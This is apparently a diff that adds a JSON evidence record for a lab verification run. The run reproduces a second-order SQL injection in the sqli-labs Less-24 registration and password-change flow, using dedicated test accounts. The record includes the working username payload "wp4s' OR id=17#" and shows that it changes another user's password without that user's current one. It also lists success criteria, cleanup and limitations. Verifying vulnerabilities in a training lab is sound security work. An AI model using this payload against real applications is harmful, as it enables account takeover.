@@ -1,0 +1,74 @@
+{
+  "run_id": "wp4-20261019-sqli005-low",
+  "sample_id": "SQLI-005",
+  "path_id": "Less-24 register/login/pass_change",
+  "condition_key": "env=sqli-labs-wsl-01|role=anonymous|security=n/a|object=dedicated-wp4v|state=initialized",
+  "observations": {
+    "steps": {
+      "victim_registered": {
+        "id": "17",
+        "password_sha256": "ad93009b5f654b060be3fe88c92c85bfa72711d479160e280d8d3311e25e8caa"
+      },
+      "normal_login": true,
+      "normal_pass_change": {
+        "reported_success": true,
+        "password_sha256_after": "99775ee07f1e67447f7c0319b7db80d8909b4174e4333a1b624dc9729092ff92",
+        "changed": true
+      },
+      "normal_flow_restored": true,
+      "attacker_registered": {
+        "payload": "wp4s' OR id=17#",
+        "payload_length": 15,
+        "stored_username": "wp4s' OR id=17#"
+      },
+      "attacker_session": {
+        "login_status": 302,
+        "login_location": "logged-in.php",
+        "session_username_contains_payload": true
+      },
+      "injected_update": {
+        "reported_success": true,
+        "victim_password_changed": true,
+        "victim_password_sha256_before": "ad93009b5f654b060be3fe88c92c85bfa72711d479160e280d8d3311e25e8caa",
+        "victim_password_sha256_after": "9070138f80791215a1e6ef9da864f308e53f559061b86479afaf2fbf8c26c8be",
+        "attacker_password_unchanged": true,
+        "current_password_supplied": "<not-the-victim-password>"
+      },
+      "independent_login_check": {
+        "old_password_rejected": true,
+        "new_password_accepted": true,
+        "old_session_username": "",
+        "new_session_username": "wp4v"
+      }
+    },
+    "cleanup": {
+      "deleted_dedicated_users": true,
+      "remaining_rows": 0
+    }
+  },
+  "success_criteria": [
+    "Normal registration, login and password change complete for a dedicated user.",
+    "The dedicated attacker name is stored verbatim and returned into the session by login.",
+    "An UPDATE issued from the attacker session changes a different dedicated user's password.",
+    "The attacker supplies no valid current password for the victim.",
+    "Independent login checks show the victim's old password fails and the injected password works.",
+    "Dedicated test users are removed after the run."
+  ],
+  "limitations": [
+    "Only the Less-24 registration/login/pass-change chain is covered.",
+    "The deployment uses PHP 5.6 with ext/mysql and MariaDB 10.6; other versions are out of scope.",
+    "The victim is a dedicated account, not a pre-existing administrator."
+  ],
+  "artifacts": [
+    {
+      "path": "verification/evidence/wp4-20261019-sqli005-low/request.redacted.json",
+      "sha256": "286a77ad60a9f05411fbb92f2e7df52725b611ed00106f8f883fbb96779fa004",
+      "description": "request.redacted.json"
+    },
+    {
+      "path": "verification/evidence/wp4-20261019-sqli005-low/response.redacted.txt",
+      "sha256": "c86e5842472d7b504abd4e9cdb166a71534ef8ba917812d1a156a0d47343b9b7",
+      "description": "response.redacted.txt"
+    }
+  ]
+}
